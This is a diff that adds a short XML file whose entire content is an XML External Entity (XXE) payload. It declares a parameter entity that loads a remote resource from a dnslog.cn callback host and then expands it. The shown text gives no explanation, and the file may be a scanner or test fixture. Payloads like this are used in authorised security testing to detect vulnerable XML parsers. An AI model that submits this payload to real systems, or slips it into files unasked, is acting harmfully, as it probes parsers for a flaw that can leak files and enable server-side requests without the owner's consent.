@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE convert [
+    <!ENTITY % remote SYSTEM "http://mjv33y.dnslog.cn/xxetest">
+    %remote;
+]>
